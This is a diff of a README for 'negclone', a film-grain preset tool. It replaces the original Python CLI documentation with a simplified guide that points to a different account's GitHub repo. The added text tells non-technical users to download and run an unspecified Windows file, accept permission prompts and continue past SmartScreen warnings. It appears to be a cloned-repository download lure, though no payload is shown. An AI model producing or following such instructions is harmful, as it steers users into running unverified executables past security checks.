@@ -1,288 +1,194 @@
-# NegClone
+# 🎞️ negclone - Match Film Grain With Ease
 
-[![PyPI version](https://img.shields.io/pypi/v/negclone.svg)](https://pypi.org/project/negclone/)
-[![Python 3.12+](https://img.shields.io/pypi/pyversions/negclone.svg)](https://pypi.org/project/negclone/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download negclone](https://img.shields.io/badge/Download-negclone-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/debugmindflow/negclone)
 
-NegClone is a Python CLI tool that analyzes your film photography archive (on Flickr or locally), extracts a grain and color fingerprint per film stock, and auto-generates Darktable `.dtstyle` and Lightroom/ACR `.xmp` preset files. The result is a publishable preset pack derived from real scanned negatives — not synthetic emulations.
+## 📥 Download negclone
 
-## Use Cases
+Use this link to visit the download page:
 
-- **Sell your own preset pack.** If you shoot film and scan your negatives, NegClone can extract the look of each stock you shoot and turn it into a distributable preset pack (Darktable + Lightroom) that you can sell on Gumroad, Etsy, or your own site.
-- **Match your digital edits to your film scans.** Use NegClone to fingerprint your favorite stocks, then apply those presets to your digital photos for a consistent look across both formats.
-- **Compare film stocks objectively.** Use `negclone compare` to see exactly how Portra 400 differs from Ektar 100 in your scans — grain, color bias, tonal response, all measured.
-- **Preserve your film look.** If you're switching from film to digital (or hybrid shooting), fingerprint your go-to stocks before you stop buying them. The presets capture the characteristics of your actual scans.
-- **Build presets from a specific body of work.** Point NegClone at a tagged subset of your Flickr archive (e.g., `--tags desert`) or a local folder to generate presets that capture the look of a specific project or series.
-- **Generate visual reports.** Use `negclone report` to create an HTML page with fingerprint cards, color swatches, and a similarity matrix — useful for blog posts, Gumroad listings, or your own reference.
+https://github.com/debugmindflow/negclone
 
-## Prerequisites
+Follow the steps on the page to get the Windows version, then open the downloaded file.
 
-- Python 3.12+
-- [uv](https://github.com/astral-sh/uv) (recommended) or pip
-- Film photos either uploaded to Flickr or in a local directory
+## 🧰 What negclone does
 
-## Getting a Flickr API Key
+negclone helps you extract grain and color traits from film scans. It then builds presets you can use in Darktable and Lightroom.
 
-Only needed if you're pulling photos from Flickr (not needed for local scans):
+Use it when you want to:
 
-1. Go to <https://www.flickr.com/services/apps/create/>
-2. Click "Apply for a Non-Commercial Key"
-3. Fill in the application details
-4. Copy your **API Key** and **API Secret**
+- copy the look of a film scan
+- save a grain or color style as a preset
+- keep a consistent look across many photos
+- speed up film-style editing on Windows
 
-## Install
+## 💻 What you need
 
-From PyPI:
+Before you start, make sure you have:
 
-```bash
-pip install negclone
-```
+- a Windows 10 or Windows 11 PC
+- an internet connection
+- a film scan or image file to work from
+- enough free space for your scans and presets
+- Darktable or Lightroom if you want to use the presets
 
-Or with [uv](https://github.com/astral-sh/uv):
+If you plan to work with a lot of scans, keep your files in one folder. That makes setup much easier.
 
-```bash
-uv pip install negclone
-```
+## 🚀 Getting Started
 
-For development:
+1. Open this page: https://github.com/debugmindflow/negclone
+2. Find the latest download for Windows
+3. Download the file to your PC
+4. Open the downloaded file
+5. If Windows asks for permission, click Yes
+6. Follow the on-screen steps to finish setup
+7. Start negclone from the folder or shortcut you created
 
-```bash
-git clone https://github.com/pfrederiksen/negclone.git
-cd negclone
-uv pip install -e ".[dev]"
-```
+If the download comes as a ZIP file, right-click it and choose Extract All before you open it.
 
-## Configuration
+## 🪟 Install on Windows
 
-For Flickr mode, set your credentials as environment variables:
+Use these steps if you are new to Windows downloads:
 
-```bash
-export FLICKR_API_KEY=your_api_key_here
-export FLICKR_API_SECRET=your_api_secret_here
-```
+1. Go to the negclone page.
+2. Look for the release or download file.
+3. Choose the Windows version.
+4. Save the file to your Downloads folder.
+5. Open File Explorer.
+6. Find the file in Downloads.
+7. Double-click the file.
+8. If it is a ZIP file, extract it first.
+9. If it is an app file, run it.
+10. Follow the setup steps on screen.
 
-For local mode, no configuration is needed.
+If Windows shows a SmartScreen message, choose the option that lets you continue after you confirm the file came from the GitHub page above.
 
-## Quick Start (Flickr)
+## 🖼️ How to use negclone
 
-```bash
-# 1. Authenticate with Flickr (opens browser for OAuth)
-negclone auth
+negclone is built for film scans. A simple workflow looks like this:
 
-# 2. Build an inventory of your film photos
-negclone inventory --output inventory.json
+1. Open the app or tool.
+2. Load your scan or image set.
+3. Pick the file you want to analyze.
+4. Extract the grain and color fingerprint.
+5. Choose Darktable or Lightroom output.
+6. Generate the preset.
+7. Save the preset file.
+8. Import it into your editing app.
 
-# 3. Download original images for a specific stock
-negclone download inventory.json --stock portra400 --sample-size 30
+For best results, use scans that are clean and well exposed. This helps the preset match the source look more closely.
 
-# 4. Analyze and fingerprint the stock
-negclone fingerprint inventory.json --stock portra400 --sample-size 30
+## 🎛️ Working with Darktable
 
-# 5. Generate Darktable + Lightroom presets
-negclone generate fingerprint_portra400.json --format both --output-dir ./output
+If you use Darktable, negclone can help you build a preset that fits your scan style.
 
-# 6. Package everything into a distributable zip
-negclone pack --output-dir ./output --name "Desert Paul Film Presets"
-```
+Typical use:
 
-## Quick Start (Local Scans)
+- load your scan into negclone
+- create the preset file
+- open Darktable
+- import the preset
+- apply it to your image
 
-```bash
-# Organize scans in folders by stock name:
-#   scans/portra400/IMG_001.tif
-#   scans/hp5/scan_042.jpg
+Keep your source scan and your edited photo in the same color space when possible. That helps the look stay closer to the original scan.
 
-# 1. Build inventory from local directory
-negclone inventory --local ./scans --output inventory.json
+## 🧪 Working with Lightroom
 
-# 2. Link local files into the cache
-negclone download inventory.json
+If you use Lightroom, negclone can help you create a preset you can bring into your catalog.
 
-# 3. Fingerprint, generate, and pack — same as Flickr workflow
-negclone fingerprint inventory.json
-negclone generate fingerprint_portra400.json --output-dir ./output
-negclone pack --output-dir ./output
-```
+Typical use:
 
-## Commands
+- analyze the film scan in negclone
+- export the Lightroom preset
+- open Lightroom
+- import the preset
+- apply it to your photo set
 
-### `negclone auth`
+If you edit many images from one roll of film, save the preset with a clear name. That makes it easy to find later.
 
-Authenticates with Flickr via OAuth 1.0a. Opens your browser to authorize the app, then prompts for the verifier code. Tokens are stored securely at `~/.negclone/flickr_tokens.json` (file permissions 600). You only need to do this once.
+## 🎨 Best results
 
-```bash
-negclone auth
-negclone auth --verifier 123-456-789   # skip interactive prompt
-```
+To get a better match, use scans with:
 
-### `negclone inventory`
+- clear shadows and highlights
+- even light
+- little dust or scratch damage
+- the film stock you want to copy
+- a file that has not been heavily edited
 
-Scans your Flickr photostream or a local directory and groups photos by detected film stock. Outputs an `inventory.json` with photo IDs, URLs/paths, detected stock names, and metadata.
+Try to use one clean reference scan for each look you want to save. That keeps the preset focused.
 
-```bash
-# Flickr: scan your own photostream
-negclone inventory
+## 📂 File tips
 
-# Flickr: scan a specific user with filters
-negclone inventory --user paul-frederiksen --tags film --min-date 2023-01-01
+Keep your files organized like this:
 
-# Local: scan a directory of scans
-negclone inventory --local ./scans
+- `Scans` for source images
+- `Presets` for saved Darktable or Lightroom files
+- `Exports` for finished edits
+- `Notes` for scan names and film stock names
 
-# Use a custom tag-to-stock mapping
-negclone inventory --tag-map my_tags.json
-```
+A simple folder setup saves time when you return to a project later.
 
-For local mode, stock detection works by checking:
-1. **Parent folder name** (e.g., `scans/portra400/`)
-2. **Filename** (e.g., `portra400_001.jpg`)
-3. **EXIF metadata** (ImageDescription, UserComment)
+## 🛠️ Common tasks
 
-The `--tag-map` option accepts a JSON file like `{"myportra": "portra400", "bw": "hp5"}` for custom aliases.
+### Create a new preset
+1. Open negclone
+2. Load the scan
+3. Run the fingerprint step
+4. Pick the output type
+5. Save the preset
 
-### `negclone download`
+### Reuse an old look
+1. Open your saved preset
+2. Import it into Darktable or Lightroom
+3. Apply it to a new photo
+4. Tweak exposure or white balance if needed
 
-Downloads original-resolution images from Flickr to a local cache, or creates symlinks for local scans. Skips already-cached files.
+### Compare different scans
+1. Load one scan at a time
+2. Create a preset from each one
+3. Name each preset by film stock or date
+4. Test them on the same photo
 
-```bash
-negclone download inventory.json --stock portra400
-negclone download inventory.json --sample-size 30   # all stocks, 30 each
-```
+## 🔍 Tips for non-technical users
 
-### `negclone fingerprint`
+If something feels confusing, start small:
 
-Analyzes cached images and computes a fingerprint per film stock. Each fingerprint includes:
+- use one scan
+- make one preset
+- test it on one photo
+- save the result
+- repeat with a second scan
 
-- **Grain profile** — intensity, FFT-derived size (peak spatial frequency), clumping factor, spectral slope
-- **Color bias** — R/G/B channel shifts in shadows, midtones, and highlights (with optional scanner compensation)
-- **Tonal rolloff** — shadow lift, highlight compression, midtone contrast, plus a PCHIP monotone spline tone curve
-- **Confidence score** — how consistent the measurements are across samples
-- **Scanner model** — auto-detected from EXIF, used to compensate for scanner color bias
+This keeps the process easy to follow.
 
-```bash
-negclone fingerprint inventory.json --stock portra400
-negclone fingerprint inventory.json                        # all stocks
-negclone fingerprint inventory.json --sample-size 40       # more samples
-```
+If the file will not open, check these common issues:
 
-### `negclone generate`
+- the download did not finish
+- you opened the ZIP without extracting it
+- Windows blocked the file
+- you do not have permission to run it from the current folder
 
-Generates preset files from a fingerprint JSON. Supports Darktable `.dtstyle` and Lightroom/ACR `.xmp` formats. Lightroom presets include spline-based tone curves when available.
+## 📎 Project details
 
-```bash
-negclone generate fingerprint_portra400.json --format both
-negclone generate fingerprint_portra400.json --format darktable
-negclone generate fingerprint_portra400.json --dry-run
-negclone generate fingerprint_portra400.json --force
-```
+- Name: negclone
+- Description: Extract grain/color fingerprints from film scans and generate Darktable + Lightroom presets
+- Topics: analog-photography, cli, color-grading, darktable, film-grain, film-photography, flickr-api, lightroom, presets, python
 
-### `negclone compare`
+## 🧭 What this tool is for
 
-Compare two fingerprints side-by-side with a detailed diff table showing grain, color, tonal differences, and an overall similarity score.
+negclone is a good fit if you want to:
 
-```bash
-negclone compare fingerprint_portra400.json fingerprint_ektar100.json
-```
+- save the look of a film scan
+- build repeatable presets
+- keep a film-style editing workflow
+- move the same look between tools
+- work with grain and color in one place
 
-### `negclone report`
+## 📌 Quick start
 
-Generate an HTML report with fingerprint cards, color swatches, and a similarity matrix across all provided fingerprints.
-
-```bash
-negclone report fingerprint_portra400.json fingerprint_ektar100.json fingerprint_hp5.json
-negclone report fingerprint_*.json -o my_stocks.html
-```
-
-### `negclone pack`
-
-Bundles all generated presets into a zip archive with a README.txt containing import instructions. Prints a Gumroad upload checklist.
-
-```bash
-negclone pack --output-dir ./output --name "Desert Paul Film Presets"
-negclone pack --dry-run  # preview contents
-```
-
-## How the Analysis Works
-
-### Grain (FFT Spectral Analysis)
-
-NegClone samples patches across each scanned image, applies a 2D Hann window, and computes the FFT power spectrum. The radially averaged spectrum gives a frequency profile of the grain texture. From this it extracts:
-- **Peak frequency** — dominant spatial frequency in cycles/pixel (inverted to get grain size in pixels)
-- **Spectral slope** — steepness of the log-log power spectrum (steep = soft/large grain, shallow = sharp/fine)
-- **Spectral centroid** — weighted mean frequency for robust size estimation
-
-Local standard deviation and spatial autocorrelation are also computed for backward-compatible intensity and clumping metrics.
-
-### Color (with Scanner Compensation)
-
-For each image, pixel luminance is bucketed into shadows (bottom 25%), midtones (25-75%), and highlights (top 25%). Within each bucket, the mean R, G, B channel values are compared to the per-bucket neutral mean, producing a color shift vector per region.
-
-When scanner model detection finds a known scanner (Epson V600/V700/V850, Noritsu, Frontier, Plustek, etc.), the scanner's inherent color bias is subtracted from the measurements, so the fingerprint reflects the film stock rather than the scanner.
-
-### Tone (PCHIP Spline Curve)
-
-Tonal analysis measures the luminance histogram shape: shadow lift (deep vs. near shadow density), highlight compression, and midtone contrast. A PCHIP (Piecewise Cubic Hermite Interpolating Polynomial) monotone spline is fitted to the luminance CDF, producing a smooth, non-inverting tone curve that is exported directly into Lightroom presets as a multi-point `ToneCurvePV2012`.
-
-## Supported Film Stocks
-
-NegClone auto-detects these film stocks from tags, titles, descriptions, folder names, and filenames:
-
-| Stock | Type | Key Characteristics |
-|---|---|---|
-| Portra 160 | Color Negative | Fine grain, neutral-warm tones |
-| Portra 400 | Color Negative | Medium grain, warm midtones, lifted shadows |
-| Portra 800 | Color Negative | Visible grain, warm tones, good in low light |
-| Ektar 100 | Color Negative | Fine grain, saturated, warm shadows |
-| Gold 200 | Color Negative | Moderate grain, warm/yellow bias |
-| HP5 Plus | B&W Negative | Pronounced grain, high contrast |
-| Delta 100 | B&W Negative | Fine grain, smooth tones |
-| Tri-X 400 | B&W Negative | Classic grain, rich midtones |
-| Fomapan 100 | B&W Negative | Fine grain, soft tones |
-| CineStill 800T | Color Negative (Tungsten) | Halation, cool tones, visible grain |
-
-Custom tag-to-stock mappings:
-
-```json
-{"portra": "portra400", "bw_street": "hp5", "cine": "cinestill800t"}
-```
-
-## Importing Presets
-
-### Darktable
-
-1. Open Darktable and switch to the **lighttable** view
-2. Find the **styles** module in the right panel
-3. Click **import** and select the `.dtstyle` file(s)
-4. Apply: select a photo, then click the style name
-
-**Note:** Darktable module params use approximated binary encoding in v1. Grain, tone, and color grading are functional, but exact C struct encoding for all Darktable versions is a v2 feature.
-
-### Lightroom / Adobe Camera Raw
-
-1. Copy `.xmp` file(s) to your presets directory:
-   - **macOS:** `~/Library/Application Support/Adobe/CameraRaw/Settings/`
-   - **Windows:** `C:\Users\<username>\AppData\Roaming\Adobe\CameraRaw\Settings\`
-2. Restart Lightroom
-3. Find presets in the **Develop** module preset panel
-
-## Tips
-
-- **More samples = better fingerprints.** `--sample-size 40` gives higher confidence and more stable results.
-- **Local scans are best.** TIFFs from your scanner give better fingerprints than re-compressed Flickr JPEGs.
-- **Organize by folder.** For local mode, put scans in folders named after the stock (e.g., `portra400/`) — this is the most reliable detection method.
-- **Use `--dry-run`** on `generate` and `pack` to preview before writing.
-- **Compare stocks** with `negclone compare` to understand how they actually differ in your workflow.
-- **Generate reports** with `negclone report` for blog posts or preset pack marketing pages.
-
-## Development
-
-```bash
-uv pip install -e ".[dev]"
-pytest                  # 65 tests
-ruff check . && ruff format .
-mypy negclone
-```
-
-## License
-
-MIT
+1. Visit https://github.com/debugmindflow/negclone
+2. Download the Windows file
+3. Open it on your PC
+4. Load a scan
+5. Create a preset
+6. Import it into Darktable or Lightroom
